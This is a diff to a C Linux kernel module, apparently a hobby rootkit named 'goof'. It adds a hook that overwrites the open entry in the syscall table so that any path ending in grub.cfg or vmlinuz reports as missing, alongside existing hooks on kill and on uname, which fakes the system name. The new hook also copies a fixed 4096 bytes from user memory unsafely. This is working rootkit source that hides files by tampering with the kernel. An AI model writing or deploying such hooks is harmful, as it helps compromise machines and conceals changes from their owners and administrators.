@@ -45,6 +45,54 @@ unsigned long *find(void) {
 	return NULL;
 }
 
+/* @brief prevent reading and writing special files
+ *
+ *
+ *
+ *
+ *
+ *
+ */
+asmlinkage int 
+goofy_open(const char *pathname, int flags, mode_t mode)
+{
+	char a[4096];
+	copy_from_user(a, pathname, 4096);
+	int len = strlen(a);
+	//grub.cfg
+	if(len > 8){
+		if(a[len-8] == 'g' && a[len-7] == 'r' && a[len-6] == 'u' && a[len-5] == 'b' && a[len-4] == '.' && a[len-3] == 'c' && a[len-2] == 'f' && a[len-1] == 'g'){
+			printk("Path: %s\n", a);	
+			return -ENOENT;
+		}
+
+	}
+	if(len > 7){
+		//vmlinuz
+		if(a[len-7] == 'v' && a[len-6] == 'm' && a[len-5] == 'l' && a[len-4] == 'i' && a[len-3] == 'n' && a[len-2] == 'u' && a[len-1] == 'z'){
+			printk("Path: %s\n", a);	
+			return -ENOENT;
+		}
+	}
+/*	if(strstr(a, "grub") != NULL){
+		//printk("Path: %s\n", a);
+		return -ENOENT;
+	}
+	if(strstr(a, "vmlinuz") != NULL){
+		//printk("Path: %s\n", a);
+		return -ENOENT;
+	}
+*/	//printk("%c%c\n", a[0], a[1]);
+//	printk("HERE :)\n");
+/*	printk("%x\n", pathname);
+	if(pathname != NULL){
+		struct filename *tmp = pathname;
+		//tmp = getname(pathname);
+		printk("%s\n", tmp->name);		
+	}
+*/	return (*original_open)(pathname, flags, mode);
+}
+
 /* @brief the hacked version of uname: replaces Linux (or whatever) with Macos (or whatever)
  *
  * Run the OG uname to get the correct value for most things. Copy our new sysname
@@ -366,6 +414,9 @@ goof_init(void) {
 	original_kill = __sys_call_table[__NR_kill];
 	__sys_call_table[__NR_kill] = goofy_kill;
 
+	original_open = __sys_call_table[__NR_open];
+	__sys_call_table[__NR_open] = goofy_open;
+
 	//NO - waiting on an LDE @Scott Court
 	//create_tramp((unsigned long*)__sys_call_table[__NR_kill], (unsigned long *)goofy_kill, 2, 16);
 	//Creating a new trampoline - DEBUG
@@ -388,7 +439,7 @@ goof_exit(void) {
 
 
 	__sys_call_table[__NR_kill] = original_kill;
-
+	__sys_call_table[__NR_open] = original_open;
 
 	//remove_tramp(2);
 	printk("[goof] module removed\n");
